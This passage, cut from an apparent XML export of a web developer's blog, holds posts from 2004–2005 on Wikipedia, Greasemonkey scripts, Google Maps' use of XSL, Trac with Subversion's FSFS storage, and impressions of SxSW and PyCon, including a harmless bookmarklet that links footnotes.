 &lt;li&gt;The Wikimedia foundation has an attractive quarterly newsletter, the &lt;a href=&quot;http://wikimediafoundation.org/wiki/Wikimedia_Quarto&quot;&gt;Wikimedia Quarto&lt;/a&gt;. September's issue includes an &lt;a href=&quot;http://wikimediafoundation.org/wiki/Wikimedia_Quarto/0409/En-5&quot;&gt;interview with Ward Cunningham&lt;/a&gt;.&lt;/li&gt;
 &lt;li&gt;Wikipedia provides a great way to sharpen your language skills; not only does Wikibooks have guides to teaching yourself &lt;a href=&quot;http://en.wikibooks.org/wiki/French&quot;&gt;French&lt;/a&gt; and &lt;a href=&quot;http://en.wikibooks.org/wiki/German&quot;&gt;German&lt;/a&gt; (among &lt;a href=&quot;http://en.wikibooks.org/wiki/Languages_bookshelf&quot; title=&quot;Languages bookshelf&quot;&gt;others&lt;/a&gt;) but the multi-lingual versions of Wikipedia provide excellent practise in reading comprehension. Compare the &lt;a href=&quot;http://en.wikipedia.org/wiki/Bath&quot; title=&quot;Bath, in English&quot;&gt;English&lt;/a&gt; and &lt;a href=&quot;http://fr.wikipedia.org/wiki/Bath&quot; title=&quot;Bath, in French&quot;&gt;French&lt;/a&gt; entries on Bath, for example.&lt;/li&gt;
 &lt;li&gt;The Wikimedia foundation recently received a small grant to develop a &lt;a href=&quot;http://meta.wikimedia.org/wiki/Wikijunior&quot; title=&quot;Wikijunior&quot;&gt;series of children's books&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The deeper I dig in to Wikipedia, the more amazed I become. I see it as more than just a collaborative encyclopaedia; it's a testament to humanity's ability to work together for the greater good. I guess you could say I'm in &lt;a href=&quot;http://en.wikipedia.org/wiki/Wikipedia:WikiLove&quot;&gt;WikiLove&lt;/a&gt; :)&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Update:&lt;/strong&gt; Fixed links, thanks to corrections posted in the comments. If this entry had been a wiki page, people could have fixed them themselves...&lt;/p&gt;</field>
		<field name="created">2004-12-23 00:57:42</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1465</field>
		<field name="title">map.search.ch</field>
		<field name="slug">swissMaps</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;Forget about &lt;a href=&quot;http://www.google.com/webhp?complete=1&quot;&gt;Google Suggest&lt;/a&gt;; if you want to see some &lt;em&gt;really&lt;/em&gt; impressive dynamic web content go and have a play with &lt;a href=&quot;http://map.search.ch/&quot;&gt;map.search.ch&lt;/a&gt;. It uses XMLHttpRequest and a bunch of other tricks to let you smoothly pan and zoom over an enormous and detailed map of Switzerland, based on satelite photos (so you can zoom right in to individual streets and see the houses). Even better, it supports hackable &lt;acronym title=&quot;Universal Republic of Love&quot;&gt;URL&lt;/acronym&gt;s letting you link directly to &lt;a href=&quot;http://map.search.ch/geneva&quot; title=&quot;Geneva&quot;&gt;cities&lt;/a&gt; or even &lt;a href=&quot;http://map.search.ch/bern/kramgasse+49&quot; title=&quot;Kramgasse 49, Bern&quot;&gt;street addresses&lt;/a&gt;.&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;The dynamic map resizes with your browser window, and the whole lot works in pretty much every modern browser (&lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt;, Mozilla, Opera, Safari, Konqueror) and degrades to a static version for everything else.&lt;/p&gt;

&lt;p id=&quot;p-2&quot;&gt;It &lt;a href=&quot;http://www.bernhardseefeld.ch/archives/000099.html&quot; title=&quot;map.search.ch launch&quot;&gt;launched back in October&lt;/a&gt; but I hadn't heard anything about it until Harry &lt;a href=&quot;http://www.sitepoint.com/blog-post-view.php?id=220528&quot; title=&quot;Prototypes&quot;&gt;tipped me off&lt;/a&gt;. 2005 is going to be &lt;a href=&quot;http://www.sitepoint.com/blog-post-view.php?id=222195&quot; title=&quot;2005: The year of the DOM&quot;&gt;an exciting year&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2005-01-05 21:44:10</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1466</field>
		<field name="title">Fixing MSDN with Greasemonkey</field>
		<field name="slug">greasemonkey</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;Site specific browser customisations have been a &lt;a href=&quot;http://simon.incutio.com/archive/2004/07/15/persite&quot;&gt;a&lt;/a&gt; &lt;a href=&quot;http://simon.incutio.com/archive/2004/07/20/innovate&quot; title=&quot;Site-specific extensions&quot;&gt;recurring&lt;/a&gt; &lt;a href=&quot;http://simon.incutio.com/archive/2004/08/19/specific&quot; title=&quot;Site specific stylesheets in Mozilla&quot;&gt;theme&lt;/a&gt; on this site over the past six months. Thanks to the ever inventive Aaron Boodman that problem is pretty much solved. &lt;a href=&quot;http://greasemonkey.mozdev.org/&quot;&gt;Greasemonkey&lt;/a&gt; is a plugin for Firefox that lets you create user site customisation scripts (&lt;code&gt;.script.js&lt;/code&gt;), easily install them in Firefox and then set which sites they should be run on. Michael Moncur has a &lt;a href=&quot;http://javascript.weblogsinc.com/entry/1234000273026520/&quot;&gt;handy tutorial&lt;/a&gt; on getting started.&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;I've already found reason to write my first script. For all of its faults, one thing that can be said for Internet Explorer is that its technical documentation runs rings around its competitors. Safari and Opera have virtually no technical documentation at all, while Mozilla's is piecemeal to say the least (let's hope they listen to &lt;a href=&quot;http://www.infoworld.com/article/05/01/07/02OPstrategic_1.html&quot; title=&quot;Open source documentation&quot;&gt;Jon Udell&lt;/a&gt; and &lt;a href=&quot;http://www.tbray.org/ongoing/When/200x/2005/01/07/TechWikiDoc&quot; title=&quot;TechWikiDoc&quot;&gt;Tim Bray&lt;/a&gt;). Unfortunately, &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt;'s documentation is hidden away on the always frustrating &lt;a href=&quot;http://msdn.microsoft.com/&quot;&gt;MSDN&lt;/a&gt;. The good stuff is in the &lt;a href=&quot;http://msdn.microsoft.com/library/default.asp?url=/workshop/author/dhtml/reference/dhtml_reference_entry.asp&quot;&gt;HTML and DHTML reference&lt;/a&gt;, but information on which versions (and platforms) of &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; can cope with which objects is no where to be found.&lt;/p&gt;

&lt;p id=&quot;p-2&quot;&gt;Or at least that's what I thought, until someone on &lt;acronym title=&quot;Internet Relay Chat&quot;&gt;IRC&lt;/acronym&gt; told me to hover over the &lt;samp&gt;event&lt;/samp&gt; box at the bottom of &lt;a href=&quot;http://msdn.microsoft.com/workshop/author/dhtml/reference/properties/cancelbubble.asp&quot; title=&quot;cancelBubble Property&quot;&gt;this page&lt;/a&gt;. Nothing happened (in Safari), so I tried Firefox and IE5/Mac. Still nothing, so I viewed source and discovered that the platform information is hidden away in a made-up &lt;code&gt;platinfo&lt;/code&gt; attribute on the link and revealed using IE/Windows specific JavaScript. Doh!&lt;/p&gt;

&lt;p id=&quot;p-3&quot;&gt;A few minutes with Greasemonkey and I had a solution: &lt;a href=&quot;http://simon.incutio.com/code/greasemonkey/msdn-platinfo.user.js&quot; title=&quot;msdn-platinfo.user.js&quot;&gt;this user script&lt;/a&gt; restricted to &lt;acronym title=&quot;Universal Republic of Love&quot;&gt;URL&lt;/acronym&gt;s matching &lt;code&gt;http://msdn.microsoft.com/workshop/author/dhtml/reference/*&lt;/code&gt;. It's not pretty, but it works - and I'm sure it could be made to look quite decent given a little extra effort.&lt;/p&gt;</field>
		<field name="created">2005-01-08 13:09:52</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1467</field>
		<field name="title">rel=&quot;nofollow&quot;</field>
		<field name="slug">relNoFollow</field>
		<field name="body">&lt;p&gt;Reading between the lines (which in this case isn't particularly hard), &lt;a href=&quot;http://archive.scripting.com/2005/01/14#When:11:45:23AM&quot; title=&quot;Scripting News&quot;&gt;this&lt;/a&gt; and &lt;a href=&quot;http://www.bloggercon.org/2005/01/15#a3294&quot; title=&quot;Placeholder&quot;&gt;this&lt;/a&gt; (don't forget to view source) suggest that Google are soon to announce that they won't be calculating PageRank for links with a &lt;code class=&quot;html&quot;&gt;rel=&quot;nofollow&quot;&lt;/code&gt; attribute. Finally, an official way of fighting the economics of comment spam by denying PageRank on user-submitted link content. Sam Ruby &lt;a href=&quot;http://www.intertwingly.net/blog/2005/01/16/rel-nofollow&quot;&gt;points&lt;/a&gt; to Mark Pilgrim's &lt;a href=&quot;http://www.intertwingly.net/blog/2003/11/17/Comment-Throttle#c1069204247&quot;&gt;prediction&lt;/a&gt; that spammers won't care - they'll spam anyway, on the offchance that they hit somewhere undefended. I'm optimistic - if the major weblog (and wiki) vendors get behind this one it could help stem the tide.&lt;/p&gt;

&lt;p&gt;As an aside, I have exams starting in a week and plenty to revise, so I'll probably be on hiatus until the end of the month.&lt;/p&gt;</field>
		<field name="created">2005-01-17 01:39:26</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1468</field>
		<field name="title">New eclipse downloads page</field>
		<field name="slug">eclipse</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;Back in November I had a &lt;a href=&quot;http://simon.incutio.com/archive/2004/11/27/eclipse&quot;&gt;bit of a whinge&lt;/a&gt; about how hard it was to find the right file on the &lt;a href=&quot;http://www.eclipse.org/&quot;&gt;Eclipse&lt;/a&gt; download page. The Eclipse project have &lt;a href=&quot;http://www.eclipse.org/downloads/index2.php&quot;&gt;unveiled a prototype&lt;/a&gt; of a new, friendlier page and it's an enormous improvement, thanks mainly to the invaluable new &quot;Looking for Eclipse?&quot; box:&lt;/p&gt;

&lt;img alt=&quot;The &amp;quot;Looking for Eclipse?&amp;quot; box has direct links to the full SDK download for the three most common platforms.&quot; height=&quot;156&quot; src=&quot;http://simon.incutio.com/images/2005/looking-for-eclipse.png&quot; width=&quot;210&quot; /&gt;

&lt;p id=&quot;p-1&quot;&gt;I for one can't wait to see this rolled out on the main site.&lt;/p&gt;</field>
		<field name="created">2005-01-20 15:44:31</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1469</field>
		<field name="title">Don't build web apps that only work in IE</field>
		<field name="slug">ffs</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;This is a rant, for which I will make no apologies. The wonderful thing about web applications is that they free you from being tied down to a specific platform. A well written web application is accessible from any platform that can run a web browser. Netscape and Microsoft both realised this back in the mid-90s, which is why Microsoft pulled out all the stops in winning the browser wars; they knew that the browser as an open application platform was a direct threat to their Windows lock-in. It's not inconceivable to argue that this was the main reason they added so many weird little proprietary &lt;acronym title=&quot;Dynamic HyperText Markup Language&quot;&gt;DHTML&lt;/acronym&gt; extensions to &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; in the following years - and it's those that are the root of the problem.&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;Why do I bring this up now? Because of this article: &lt;a href=&quot;http://www.infoworld.com/article/05/01/25/HNibmsilent_1.html&quot;&gt;IBM goes silent on Linux desktop effort&lt;/a&gt; on InfoWorld. Apparently IBM's much publicised attempt to shift all of their internal desktops to Linux by 2005 hasn't been going to smoothly. Here's their biggest problem (my emphasis):&lt;/p&gt;
&lt;blockquote cite=&quot;http://www.infoworld.com/article/05/01/25/HNibmsilent_1.html&quot;&gt;&lt;p id=&quot;p-2&quot;&gt;Though IBM volunteers have set up an internal IRC (Internet relay chat) channel where Linux problems are discussed online, &lt;strong&gt;users may experience problems running IBM's internal Web applications. Most of those applications are written for the Internet Explorer browser, which has not been ported to Linux&lt;/strong&gt;. Internet Explorer is the only browser supported by IBM's internal support desk, according to another IBMer.&lt;/p&gt;&lt;/blockquote&gt;

&lt;p id=&quot;p-3&quot;&gt;Writing internal web applications that only work in Internet Explorer in this day and age is short-sighted and inexcusable. If you really have to target only one browser, at least make it something open source and portable across platforms (the &lt;a href=&quot;http://www.mozilla.org/&quot;&gt;Mozilla&lt;/a&gt; family comes to mind). Even better, stick with &lt;a href=&quot;http://webstandards.org/&quot;&gt;web standards&lt;/a&gt;; you might find yourself reaping the benefits in a few years' time.&lt;/p&gt;</field>
		<field name="created">2005-01-26 02:42:33</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1470</field>
		<field name="title">Google Maps and XSL</field>
		<field name="slug">maps</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;I'll probably write more on this later, but it seems that &lt;a href=&quot;http://maps.google.com/&quot;&gt;Google Maps&lt;/a&gt; is using &lt;acronym title=&quot;eXtensible Stylesheet Language&quot;&gt;XSL&lt;/acronym&gt;. I spotted it loading the following pages while sniffing its activity with &lt;a href=&quot;http://livehttpheaders.mozdev.org/&quot;&gt;LiveHTTPHeaders&lt;/a&gt;:&lt;/p&gt;

&lt;ul&gt;
 &lt;li&gt;&lt;a href=&quot;http://maps.google.com/mapfiles/homepanel.xsl&quot;&gt;homepanel.xsl&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://maps.google.com/mapfiles/localinfo.xsl&quot;&gt;localinfo.xsl&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://maps.google.com/mapfiles/localpanel.xsl&quot;&gt;localpanel.xsl&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://maps.google.com/mapfiles/geocodepanel.xsl&quot;&gt;geocodepanel.xsl&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p id=&quot;p-1&quot;&gt;This is in addition to the (now expected) XMLHttpRequest stuff. There even appears to be some of Microsoft's weird &lt;a href=&quot;http://msdn.microsoft.com/workshop/author/vml/default.asp&quot; title=&quot;Introduction to Vector Markup Language (VML)&quot;&gt;VML&lt;/a&gt;, although as I'm on a Mac I don't have access to &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt;/Windows to see what it's doing with it.&lt;/p&gt;

&lt;p id=&quot;p-2&quot;&gt;The bulk of the Google Maps JavaScript appears to be hidden away in &lt;a href=&quot;http://www.google.com/mapfiles/maps.1.js&quot;&gt;maps.1.js&lt;/a&gt;, which becomes a lot more readable if you feed it through &lt;a href=&quot;http://www.prettyprinter.de/&quot;&gt;PrettyPrinter.de&lt;/a&gt;&lt;/p&gt;

&lt;p id=&quot;p-3&quot;&gt;As for Google Maps itself, it's an amazing piece of work but it's a shame they didn't follow &lt;a href=&quot;http://map.search.ch/&quot;&gt;map.search.ch&lt;/a&gt;'s lead in degrading gracefully to a static version for unsupported browsers.&lt;/p&gt;

&lt;p id=&quot;p-4&quot;&gt;If anyone has any further insights in to how it all works, please post them in a comment.&lt;/p&gt;</field>
		<field name="created">2005-02-08 14:19:37</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1471</field>
		<field name="title">Google cruft</field>
		<field name="slug">cruft</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;New Google feature: &lt;a href=&quot;http://www.google.com/googleblog/2005/02/google-movies-now-playing.html&quot;&gt;Google Movies&lt;/a&gt;. Displays aggregated movie reviews (like &lt;a href=&quot;http://www.rottentomatoes.com/&quot;&gt;Rotten Tomatoes&lt;/a&gt;), looks up local movie times based on your zip code saved in Google Local (more evidence of the fabled Google cookie), and even handles &lt;a href=&quot;http://www.google.com/search?q=movie:tomantic+zombie+movie&quot;&gt;recommendations&lt;/a&gt;.&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;The downside is that it's yet more cruft for the search results page. Here's a screenshot, with the cruft in red and the actual search results in green:&lt;/p&gt;

&lt;p class=&quot;img&quot; id=&quot;p-2&quot;&gt;&lt;img alt=&quot;A screenshot of a Google search for &amp;quot;in good company&amp;quot;, showcases how much of the page is now taken up by results from Google news, Google print and Google movies.&quot; height=&quot;501&quot; src=&quot;http://simon.incutio.com/images/2005/google-cruft.png&quot; width=&quot;620&quot; /&gt;&lt;/p&gt;

&lt;p id=&quot;p-3&quot;&gt;Ben Hammersley has &lt;a href=&quot;http://www.benhammersley.com/weblog/2005/02/24/google_movies_yet_another_category_killer.html&quot; title=&quot;Google Movies. Yet Another Category Killer.&quot;&gt;more commentary&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2005-02-24 00:34:00</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1472</field>
		<field name="title">LugRadio Live</field>
		<field name="slug">luglive</field>
		<field name="body">&lt;p&gt;The guys over at LugRadio (nice &lt;a href=&quot;http://www.lugradio.org/&quot;&gt;new site&lt;/a&gt;, see Stuart's blog for &lt;a href=&quot;http://www.kryogenix.org/days/2005/03/01/overcomplexity&quot; title=&quot;The wooden spoon of overcomplexity&quot;&gt;gnarly implementation details&lt;/a&gt;) have announced the details of their long hinted-at Linux event, &lt;a href=&quot;http://www.lugradio.org/live/2005/&quot;&gt;LugRadio Live&lt;/a&gt;. I'm pretty excited about it; word on the grape vine is that they're booking some really cool speakers, but they're completely committed to keeping a grassroots feel to things. The 15 minute lightning talks should be a lot of fun (I've tentatively offered one on Firefox extensions) and it sounds like the atmosphere will reflect that of the show - irreverent, fun and with a trip to the pub afterwards.&lt;/p&gt;

&lt;p&gt;The date for your diary is &lt;strong&gt;Saturday the 25th of June&lt;/strong&gt;, which conveniently coincides with the end of my finals. I can't wait.&lt;/p&gt;</field>
		<field name="created">2005-03-01 22:02:00</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1473</field>
		<field name="title">Problems with Trac? Switch to FSFS</field>
		<field name="slug">trac</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;I'm head over heels in love with &lt;a href=&quot;http://projects.edgewall.com/trac/&quot;&gt;Trac&lt;/a&gt;, and have been for about 6 months now. It really is best-of-breed software: it neatly integrates a wiki, a simple bug tracker and a Subversion repository browser with clean markup, a nice default design and a learning curve for new users that can be measured in minutes. No wonder it's started to show up all &lt;a href=&quot;http://dev.wp-plugins.org/&quot; title=&quot;WordPress Plugin Repository&quot;&gt;over&lt;/a&gt; &lt;a href=&quot;http://trimpath.com/project/&quot; title=&quot;TrimPath&quot;&gt;the&lt;/a&gt; &lt;a href=&quot;http://dev.rubyonrails.com/&quot; title=&quot;Ruby on Rails&quot;&gt;place&lt;/a&gt;.&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;The software has only two disadvantages. The first is that it's hideously difficult to install thanks to the myriad of dependencies (although apt-get on Debian or &lt;a href=&quot;http://fink.sourceforge.net/&quot;&gt;Fink&lt;/a&gt; on OS X go a good way towards lessening the blow). The second is that if you're using &lt;samp&gt;BDB&lt;/samp&gt; and you're not careful it can corrupt your repository. Thankfully this corruption isn't permanent (you can revert it with &lt;samp&gt;svnadmin recover&lt;/samp&gt;) but it's still very, very annoying.&lt;/p&gt;

&lt;p id=&quot;p-2&quot;&gt;Happily, a solution exists to problem two. Subversion 1.1 introduces a new storage mechanism called &lt;samp&gt;FSFS&lt;/samp&gt;. The advantages and disadvantages are discussed in &lt;a href=&quot;http://svn.collab.net/repos/svn/trunk/notes/fsfs&quot;&gt;this advocacy document&lt;/a&gt;, but the key advantages as far as Trac is concerned appear to be &quot;Write access not required for read operations&quot;, &quot;Little or no need for recovery&quot; and &quot;No umask issues&quot;. Switching a BDB Subversion repository over to FSFS is &lt;a href=&quot;http://julien.danjou.info/blog/index.php/2004/12/31/103-subversion-fsfs-migration&quot; title=&quot;Subversion fsfs migration&quot;&gt;short and painless&lt;/a&gt;, and provided you have up-to-date Subversion/Python bindings Trac will be able to access the new repository without needing any other changes at all. I've made the switch on my local machine and the weird corruption and performance issues I was having have vanished without a trace.&lt;/p&gt;

&lt;p id=&quot;p-3&quot;&gt;For the record, the trick to successfully installing Trac with Fink is to make sure it's pulling from the &quot;unstable&quot; tree. That will give you Subversion 1.1 (with FSFS support) and allow you to install the &lt;samp&gt;trac-py23&lt;/samp&gt; package which should sort everything out for you. The &lt;a href=&quot;http://projects.edgewall.com/trac/wiki/TracOnOsx&quot;&gt;instructions on the Trac wiki&lt;/a&gt; cover the essentials, but be sure not to miss the troubleshooting note about using a custom shell script in place of the regular &lt;samp&gt;trac.cgi&lt;/samp&gt;.&lt;/p&gt;</field>
		<field name="created">2005-03-04 01:11:26</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1474</field>
		<field name="title">Fixing Paul Graham's Footnotes</field>
		<field name="slug">footnotes</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;I'm a big fan of Paul Graham's essays, the latest of which is &lt;a href=&quot;http://www.paulgraham.com/start.html&quot;&gt;How to Start a Startup&lt;/a&gt;. There's just one niggling problem with them: Paul makes extensive use of footnotes, but provides no way of jumping from the reference in the text to the footnote at the bottom of the page and back up again. Instead, you have to manually down to the bottom of the article and back up again every time you hit a footnote reference.&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;I really should be finishing up my packing for SxSW (my bus leaves in an hour and a half), but I couldn't resist knocking up &lt;a href=&quot;http://simon.incutio.com/code/greasemonkey/paul-graham-footnotes.user.js&quot; title=&quot;paul-graham-footnotes.user.js&quot;&gt;a quick greasemonkey script&lt;/a&gt; to fix the problem. Install and enjoy. If you haven't installed &lt;a href=&quot;http://greasemonkey.mozdev.org/&quot;&gt;greasemonkey&lt;/a&gt; you can get the same effect by manually activating this bookmarklet: &lt;a href=&quot;javascript:(function() { var h = document.body.innerHTML;document.body.innerHTML = h.replace(/\[(\d+)\]/g, function(s,n) { if (typeof arguments.callee.vars != &amp;apos;object&amp;apos;) { arguments.callee.vars = {};}if (arguments.callee.vars[n]) {return &amp;apos;[&amp;lt;a href=&amp;quot;#ft&amp;apos;+n+&amp;apos;&amp;quot; id=&amp;quot;fb&amp;apos;+n+&amp;apos;&amp;quot;&amp;gt;&amp;apos;+n+&amp;apos;&amp;lt;/a&amp;gt;]&amp;apos;;} else {arguments.callee.vars[n] = 1;return &amp;apos;[&amp;lt;a href=&amp;quot;#fb&amp;apos;+n+&amp;apos;&amp;quot; id=&amp;quot;ft&amp;apos;+n+&amp;apos;&amp;quot;&amp;gt;&amp;apos;+n+&amp;apos;&amp;lt;/a&amp;gt;]&amp;apos;;}});})();&quot;&gt;Fix Paul Graham's Footnotes&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2005-03-11 03:09:54</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1475</field>
		<field name="title">Choice SxSW quotes</field>
		<field name="slug">quotes</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;My American adventure is ongoing; I'm still in Austin at the moment, but I'll be off to Washington D.C. in a few days and there's a small chance I'll get there via Dallas. This doesn't leave much opportunity for online shenanigans, but there were a few things from SxSW that really needed a mention. The conference, as ever, was awesome - if not for the panels then certainly for the socialising. If anything I stretched myself too thin this year trying to keep up with the Brit Pack, the WaSP crew, some ex-colleagues from Lawrence and the people I met in San Francisco back in May.&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;I met a lot of new people this year as well. Since David Nunez &lt;a href=&quot;http://www.davidnunez.com/sxsw&quot;&gt;had pointed out&lt;/a&gt; that &quot;what do you do?&quot; was a bit of a dull opening question (not to mention a conversation killer for people who dislike their job) I stuck with &quot;So what are you excited about?&quot; instead. It worked pretty well - I got a whole bunch of great answers, with the most random probably coming from the guy who was excited about mopeds (it turned out he runs &lt;a href=&quot;http://www.mopedarmy.com/&quot; title=&quot;Moped Army&quot;&gt;the world's number one moped site&lt;/a&gt;).&lt;/p&gt;

&lt;p id=&quot;p-2&quot;&gt;The most entertaining panel by far was the &lt;a href=&quot;http://www.homestarrunner.com/&quot;&gt;Home Star Runner&lt;/a&gt; one, in which the Brothers Chaps finally revealed the secret to their animation success: motion capture! I'll have to post a few pictures once I get back on a high speed 'net connection; suffice to say the constant laughter from the room was heard throughout the convention center.&lt;/p&gt;

&lt;p id=&quot;p-3&quot;&gt;Anyway, on to the quotes. The first two are from &lt;a href=&quot;http://jacobian.org/&quot;&gt;Jacob Kaplan-Moss&lt;/a&gt;:&lt;/p&gt;

&lt;p id=&quot;p-4&quot;&gt;&lt;q&gt;PHP is like a beautiful woman... with syphilis&lt;/q&gt;&lt;/p&gt;

&lt;p id=&quot;p-5&quot;&gt;&lt;q&gt;Maintaining badly written code is like trying to solve a crossword puzzle set by someone who can't spell&lt;/q&gt;&lt;/p&gt;

&lt;p id=&quot;p-6&quot;&gt;I also like this one from &lt;a href=&quot;http://dunck.us/&quot;&gt;Jeremy Dunck&lt;/a&gt;, who was justifying sharing your ideas with people at the conference despite the risk of other people implementing them first:&lt;/p&gt;

&lt;p id=&quot;p-7&quot;&gt;&lt;q&gt;It's like the lazyweb in meatspace&lt;/q&gt;&lt;/p&gt;

&lt;p id=&quot;p-8&quot;&gt;The credit for the last one goes (I think) to &lt;a href=&quot;http://wearenotsheep.com/&quot;&gt;Yvonne Adams&lt;/a&gt;, who made the sage observation that:&lt;/p&gt;

&lt;p id=&quot;p-9&quot;&gt;&lt;q&gt;South by South West is spring break for web geeks&lt;/q&gt;&lt;/p&gt;

&lt;p id=&quot;p-10&quot;&gt;It certainly is. See you all again next year!&lt;/p&gt;</field>
		<field name="created">2005-03-18 01:59:17</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1476</field>
		<field name="title">PyCon observations</field>
		<field name="slug">pycon</field>
		<field name="body">&lt;p&gt;I'm back from my two week stint in the US, and currently suffering from vicious jet-lag (my body wants me to go to sleep at 5am and wake up just past noon). Herewith some observations on PyCon, SxSW and the differences between the two.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.python.org/pycon/2005/&quot;&gt;PyCon 2005&lt;/a&gt; was a great conference, and a very different one from &lt;a href=&quot;http://2005.sxsw.com/interactive/&quot;&gt;SxSW Interactive&lt;/a&gt; the week before. While SxSW was one big social party with panels thrown in to fill the gaps, the sessions in PyCon were the main event and the social stuff (with the exception of the sprints, which I didn't really experience) was much less prominent. For the first day of the conference I actually found it quite hard to spark up conversations with strangers, something I'd been doing for pretty much the whole of SxSW. Things got better on the second and third days, but the lack of any organised social events and more reserved atmosphere meant I didn't have nearly as many random social experiences as at SxSW.&lt;/p&gt;

&lt;p&gt;The PyCon sessions really were excellent: three great keynotes (the IronPython keynote was my favourite), an excellent web track and a whole smorgasbord of interesting topics spread over the three days. I have only one big complaint: all sessions apart from the keynotes were half an hour in length. For most sessions this worked fine, but some of the more experienced presenters were obviously shackled by the half hour requirement. Bruce Eckel's presentation was the most noticable in this regard - I love the stuff he covered, but it's obvious he could have gone on for a lot longer without losing the attention of the crowd (he obviously &lt;a href=&quot;http://onthethought.blogspot.com/2005/03/pycon-and-sd.html&quot; title=&quot;PyCon and SD&quot;&gt;thought the same&lt;/a&gt;).&lt;/p&gt;

&lt;p&gt;My suggestion for next year would be to keep most of the sessions at half an hour, but schedule a small number of 45 minute sessions for presenters who are obvious candidates for longer talks. I talked to Steve Holden (this year's organiser) briefly about this and he mentioned that 45 minute sessions lead to scheduling difficulties, particularly with respect to coordinating the different tracks. I personally think that the benefits of longer sessions for certain key topics would outweigh the scheduling disadvantages.&lt;/p&gt;

&lt;p&gt;A few other PyCon observations:&lt;/p&gt;

&lt;ul&gt;
 &lt;li&gt;There were over 400 attendees, at least a hundred more than last year. This slightly exceeded the capacity of the conference center, and they'll be mobing to a larger (as yet undecided) venue for 2006.&lt;/li&gt;
 &lt;li&gt;I only attended one of the two lightning talk sessions, but it was great fun and a refreshing change from the regular panels. The highlight for me was the guy who strapped a computer to the back of his motorcycle and drove 7,000 miles across America... with Python to coordinate all of the pieces. You can read more on &lt;a href=&quot;http://ltodyssey.org/&quot; title=&quot;LT Odyssey 2004&quot;&gt;his site&lt;/a&gt;, or in &lt;a href=&quot;http://www.pyzine.com/Issue007/Section_Articles/article_MobileDataCollection.html&quot; title=&quot;Using Python to Create a Mobile Data Collection System&quot;&gt;this article&lt;/a&gt; on Py.&lt;/li&gt;
 &lt;li&gt;The two (sometimes three) tracks were well arranged, with few clashes between things that I wanted to see. This was in contrast to SxSW's 5 tracks which had serious clashes pretty much all the time.&lt;/li&gt;
 &lt;li&gt;Everyone was hiring! The conference package we got was stacked with job brochures from the conference sponsors, and the whiteboard by the registration desk had new jobs added to it every day. Sure-fire evidence that Python is finally starting to gain significance in the job market.&lt;/li&gt;
 &lt;li&gt;The lunches, included in the conference price, were excellent. The price itself was great value too - early bird for students was $125, and $175 for regular attendees. Even late registration was only (from memory) $275.&lt;/li&gt;
 &lt;li&gt;The largest venue at the center, used for the keynotes, had no WiFi! Coverage throughout the rest of the conference was good however.&lt;/li&gt;
 &lt;li&gt;I finally got to join Ted Leung and friends in a SubEthaEdit session during the Python at Google keynote. It was an electrifying experience watching each slide  transcribed in to the notes within seconds of it appearing on screen, with multiple lines developing at the same time. The results of our labour &lt;a href=&quot;http://www.sauria.com/~twl/conferences/pycon2005/20050325/Python%20at%20Google.html&quot; title=&quot;Python at Google.notes&quot;&gt;can be seen here&lt;/a&gt;. Someone really needs to put together a screencast of this kind of thing so the rest of the world knows what they're missing.&lt;/li&gt;
 &lt;li&gt;Despite my observations about the less social nature of the conference above, I met some very interesting people and had a really great time.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;It seems to me that Python and SxSW could learn some tricks from each other. Lightning talks and Birds-of-a-feather sessions would be a great addition to the SxSW lineup, while PyCon really does need some more thought put in to the social side of the conference. I hope to attend both again next year.&lt;/p&gt;</field>
		<field name="created">2005-03-28 17:08:22</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1477</field>
		<field name="title">Greasemonkey as a lightweight intermediary</field>
		<field name="slug">lightweight</field>
